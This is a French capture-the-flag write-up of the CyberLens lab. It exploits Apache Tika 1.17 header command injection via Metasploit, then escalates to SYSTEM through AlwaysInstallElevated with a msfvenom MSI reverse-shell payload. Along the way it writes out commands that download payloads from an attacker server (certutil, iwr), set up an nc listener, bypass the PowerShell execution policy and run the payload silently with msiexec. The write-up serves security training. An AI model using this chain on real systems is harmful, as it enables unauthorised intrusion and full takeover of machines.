## Challenge description

Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.Can you exploit the CyberLens web server and discover the hidden flags?

## RustScan
```shell
┌──(zcook㉿isaac)-[~/labs/cyberlens]
└─$ rustscan -b 500 -a cyberlens.thm -- -sC -sV -Pn

```

```
PORT      STATE  SERVICE       REASON          VERSION
80/tcp    open   http          syn-ack ttl 126 Apache httpd 2.4.57 ((Win64))
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp   open   msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open   netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds? syn-ack ttl 126
3389/tcp  open   ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-10T14:17:07+00:00
| ssl-cert: Subject: commonName=CyberLens
| Issuer: commonName=CyberLens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-09T14:10:08
| Not valid after:  2026-11-08T14:10:08
| MD5:     fcca 20bb f95c 108c dbc6 70db 3f00 c05a
| SHA-1:   3bbe 1069 7fee 2d0c 45e1 4934 4bca 4000 e132 4403
| SHA-256: ebcd e968 d2f6 1e58 b261 35e6 d923 2544 f286 ec59 3952 5702 0690 ae8b 8073 dd1d
| -----BEGIN CERTIFICATE-----
| MIIC1jCCAb6gAwIBAgIQGz+5/GmXQq5MDZFr8ql+CjANBgkqhkiG9w0BAQsFADAU
| MRIwEAYDVQQDEwlDeWJlckxlbnMwHhcNMjYwNTA5MTQxMDA4WhcNMjYxMTA4MTQx
| MDA4WjAUMRIwEAYDVQQDEwlDeWJlckxlbnMwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQC0Pdkhc+V+kzEkfJRQlWHaCYjBsugnyRoD+xQg6rB3InOBw9jf
| z0EwdQ8j9TXbdcZqUeRWWQ1mPS4gOxmtLQcVRevSq28uWfFN7qeVLVJ3RK/dkE0b
| T9dU2DgsO3sH/hBjrMoeLSh3DzW5LLqO+/U9tZuz+PQo4K/9al/E76k6rB73vkCj
| F0+5eqWXsvC4nU2Oq1xlFCW5nnVG0DTTt6O4O1/Qep+qtmbrI3FOAefdvZTWdEWT
| frHgaL3T5F/EfeEcu+VTEXWRD+3yWRXrMi3FuntQJpN4t+a7/QAe3q/tTjHgTnTQ
| oroaWNMYv1F+or1nP5sKqLnvER7sG+fLWw05AgMBAAGjJDAiMBMGA1UdJQQMMAoG
| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAkPZSYDfE
| 04kDdAMKH5jXt9aXS8ZsmNiGKhVW2MMSb3pNqWm3rz+Kz9Igyr+zZ7HrM+G2F6ZM
| 0a3Fnm539zsHdBvj4iXwbxzd3qxBCcMP7w671bteEMJbqxPSbRWZM2uCXmH9sf3c
| U9ZUdieZZMa4S1Fe41BV72lK+YeAXap903yszzVwUCRtn4sj5G5oRtRF1XN2Ktz8
| h8imLRxz8A/jBg3pRY0SfNbJhT4IvV/uaQqAJ78ppF9+oXT1bj/LmSs1AJV7Tpbm
| TUVneUe4OPZmGyG1OonO06kvd/Ro0LuZGNSA5/lu5F70Zv1jMAtvGI1Qeb0jbbCT
| rsciI9A9b8tbxw==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-05-10T14:18:05+00:00; -1s from scanner time.
5985/tcp  open   http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  closed pando-pub     reset ttl 126
47001/tcp open   http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   unknown       syn-ack ttl 126
49665/tcp open   msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open   msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open   unknown       syn-ack ttl 126
49668/tcp open   msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open   msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open   unknown       syn-ack ttl 126
49674/tcp open   unknown       syn-ack ttl 126
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Des choses intéressantes on a du web(80) , du SMB(135, 139, 445), rdp(3389), du winRM(5985)
On va creuser le web en premier 

## HTTP(80)

### Enumeration automatique
Pour notre content discovery on va utiliser feroxbuster 
```shell
┌──(zcook㉿isaac)-[~/labs/cyberlens]
└─$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://cyberlens.thm  
```

![[Pasted image 20260510164901.png]]
Y'a rien de vraiment intéressant 
### Enumeration manuelle
Nous nous rendons sur http://cyberlens.thm 
![[Pasted image 20260510163129.png]]Quand on scrolles on voit un service qui extrait les métadonnées des images
![[Pasted image 20260510163323.png]]

Quand on regarde le code de source on retrouve le code responsable de l'extraction des metadata
![[Pasted image 20260510163445.png]]
On retrouve ce lien dans le code et quand on y va on voir ça 
```
http://cyberlens.thm:61777/
```

![[Pasted image 20260510164101.png]]
C'est Apache Tika qui est utilisé et aussi nous avons l'endpoint qui est utilisé pour l'extraction des metadata.

Après quelque recherches on voit que la version de apache tika (1.17) est exposée à une  Header Command Injection. On va donc essayer d'exploiter cette faille et pourquoi pas avoir accès à la machine

##  Exploitation HCI 
Ref 
https://www.acunetix.com/vulnerabilities/sca/cve-2018-1335-vulnerability-in-maven-package-org-apache-tika-tika-server/
https://www.exploit-db.com/exploits/47208
#### Qu'est-ce qu'Apache Tika ?
Apache Tika est un toolkit open-source qui permet d'extraire du contenu et des métadonnées depuis des fichiers de différents formats (images, PDF, documents, etc.). Dans notre cas, il tourne en mode serveur (tika-server) sur le port 61777, exposé à des clients non authentifiés.
#### La vulnérabilité
Les versions 1.7 à 1.17 d'Apache Tika permettent à des clients d'envoyer des headers HTTP spécialement forgés au tika-server, qui peuvent être utilisés pour injecter des commandes dans la ligne de commande du serveur

En clair : Tika 1.17 passe les valeurs des headers directement à la ligne de commande du système sans les assainir, ce qui permet à un attaquant de glisser des commandes OS à l'intérieur.
#### Exploitation
Pour l'exploitation on peut passer par msfconsole, télécharger nous même l'exploit ou forger le payload  avec curl
Nous allons passer par msfconsole(pas le temps de crafter des headers)
```shell
┌──(zcook㉿isaac)-[~/labs/cyberlens]
└─$ msfconsole
```
![[Pasted image 20260510171104.png]]

On va rechercher tika et nous tombons pile sur notre exploit
![[Pasted image 20260510171151.png]]

Nous choisissons l'exploit avec 'use 0' 
![[Pasted image 20260510171510.png]]

Nous faison 'show options' ensuite pour identifier les champs à config 
![[Pasted image 20260510171739.png]]

Nous allons les configs ensuite un à un 
```
msf6 exploit(...) > set RHOSTS cyberlens.thm
msf6 exploit(...) > set RPORT 61777
msf6 exploit(...) > set LHOST <ton_ip_tun0>
msf6 exploit(...) > options   
msf6 exploit(...) > run
```
![[Pasted image 20260510172031.png]]

Nous lançons le run et nous avons accès à la machine via meterpreter
![[Pasted image 20260510173054.png]]

Vérification d'usage
```shell
meterpreter > getuid
Server username: CYBERLENS\CyberLens
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege

meterpreter > sysinfo
Computer        : CYBERLENS
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

On va demander un shell afin de rechercher notre flag
```
meterpreter > shell
Process 4708 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![[Pasted image 20260510173710.png]]
Et voici notre flag !

## Evelation de privilèges
On essaie dans un premier temps de voir les privilèges de notre user actuel et rien que nous pouvons exploiter 
![[Pasted image 20260511141939.png]]

Je m'y connais pas trop en élévations de privilèges donc j'ai essayé winpeas mais ça n'a rien donné et après beaucoup de recherches je suis tombé sur ces sites : 
https://www.hacking-notes.com/RedTeam/5.Machine/3.Active-Directory/General/Tools/PrivescCheck
https://github.com/itm4n/PrivescCheck

Ce site parle de PrivescCheck.ps1 qui est un programme qui permet d'effectuer des vérifications rapides sur un ordinateur Windows afin de détecter d'éventuelles failles permettant une élévation de privilèges. On va donc l'essayer

### PrivescCheck
On installe d'abord le programme via github avec wget
```shell
┌──(zcook㉿isaac)-[~/labs/cyberlens]
└─$ wget https://github.com/itm4n/PrivescCheck/releases/download/2026.04.29-1/PrivescCheck.ps1
--2026-05-11 22:56:52--  https://github.com/itm4n/PrivescCheck/releases/download/2026.04.29-1/PrivescCheck.ps1
Saving to: ‘PrivescCheck.ps1’

PrivescCheck.ps1                           100%[=====================================================================================>] 226.86K   901KB/s    in 0.3s    

2026-05-11 22:56:53 (901 KB/s) - ‘PrivescCheck.ps1’ saved [232303/232303]

                                                                                                                                                                         
┌──(zcook㉿isaac)-[~/labs/cyberlens]
└─$ ls
46540.py  PowerUp.ps1  PrivescCheck.ps1  winPEASx64.exe
```

Ensuite nous lançons un serveur web afin d'installer notre programme sur la machine windows 

```shell
┌──(zcook㉿isaac)-[~/labs/cyberlens]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.113.134.145 - - [11/May/2026 22:22:29] "GET /PrivescCheck.ps1 HTTP/1.1" 200 -

```

et nous le téléhargeons sur notre machine windows
```powershell
powershell iwr http://192.168.236.165/PrivescCheck.ps1 -Outfile C:\users\public\PrivescCheck.ps1
```
Et nous voyons qu'il est bien présent 
![[Pasted image 20260511230013.png]]

Nous allons maintenant l'éxécuter selon notre guide(https://github.com/itm4n/PrivescCheck) voici les deux étapes à suivre :

Windows Server a une restriction par rapport à ce que on peut éxécuter donc nous entrons la commande afin de bypass cela 
```powershell
powershell -ep bypass
```

On  charge maintenant les commandes de PrivescChecks avec la commande et on lance la vérification
```powershell
. .\PrivescCheck.ps1 

Invoke-PrivescCheck
```
Le script a tourné et nous a fait plusieurs tests et leurs status(vulnérable ou pas)
![[Pasted image 20260511231009.png]]

Mais quand nous continuons de scrollet et d'observer nous tombons sur ça. AlwaysInstallElevated is enabled

![[Pasted image 20260511230908.png]]

### Qu'est-ce que "AlwaysInstallElevated" ?

C'est une fonctionnalité de **Stratégie de Groupe (GPO)** de Windows.

Normalement, lorsqu'un utilisateur standard essaie d'installer un logiciel (un fichier `.msi`), Windows vérifie ses droits. Si l'installation nécessite d'écrire dans `C:\Program Files` ou de modifier des clés de registre système, Windows demande les identifiants d'un administrateur (le fameux message UAC).

L'option **AlwaysInstallElevated** dit à Windows : _"Peu importe qui lance l'installation d'un fichier MSI, utilise le service **Windows Installer** avec les privilèges les plus élevés (**SYSTEM**)."_

#### Pourquoi les deux clés sont-elles nécessaires ?

Pour que cette faille soit exploitable, la valeur `1` doit être présente dans ces deux ruches du registre :

1. **HKLM (HKEY_LOCAL_MACHINE) :** C'est la règle au niveau de l'ordinateur. Elle dit que la machine _autorise_ cette méthode.
    
2. **HKCU (HKEY_CURRENT_USER) :** C'est la règle au niveau de l'utilisateur. Elle confirme que l'utilisateur actuel _peut_ l'utiliser.

Puisque les clés de registre `AlwaysInstallElevated` sont activées, nous allons générer un package MSI malveillant à l'aide de `msfvenom`. Ce fichier ne contient aucun logiciel réel ; il sert de conteneur pour un payload.
Lors de l'exécution, le service Windows Installer va interpréter le package avec des privilèges **NT AUTHORITY\SYSTEM** et exécuter notre reverse shell. Cela nous permet de contourner les restrictions de l'utilisateur actuel et d'obtenir un terminal avec les pleins pouvoirs sur la machine.

### Exploitation Payload
ref : https://labex.io/fr/tutorials/kali-generate-a-standalone-payload-with-msfvenom-594349

étape 1 :création de la charge utile avec msf venom
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=<PORT_ECOUTE> -f msi -o root.msi
```
- **`-p`** : Définit la charge utile (payload). _Ex: `windows/x64/meterpreter/reverse_tcp` pour un shell Meterpreter 64-bit_.
- **`LHOST`** : L'adresse IP de votre machine Kali (ou la machine qui écoute).
- **`LPORT`** : Le port d'écoute sur votre machine.
- **`-f`** : Le format de sortie. Pour un fichier d'installation Windows, on utilise `msi`.
- **`-o`** : Le nom du fichier de sortie (ici, `payload.msi`).
![[Pasted image 20260511232333.png]]

étape2 : Transfert du payload sur la machine windows et écoute 
On a set un listener sur le port 4444 et aussi démarrer notre serveur web pour le téléchargement
```shell
┌──(zcook㉿isaac)-[~/labs/cyberlens]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Pour le transfert on va utiliser certutils
```powershell
certutil -urlcache -f http://<TON_IP_VPN>/root.msi root.msi
```
![[Pasted image 20260511233040.png]]
étape 3 : On va exécuter notre fichier root.msi
On le fait avec msiexec
```powershell
msiexec /quiet /qn /i root.msi
```
- **`/quiet`** : Mode silencieux (pas d'interface graphique).
    
- **`/qn`** : Aucune interaction utilisateur.
    
- **`/i`** : Installation normale.

![[Pasted image 20260511233409.png]]

Maintenant que nous sommes admin nous pouvons aller chercher notre flag
![[Pasted image 20260511233702.png]]

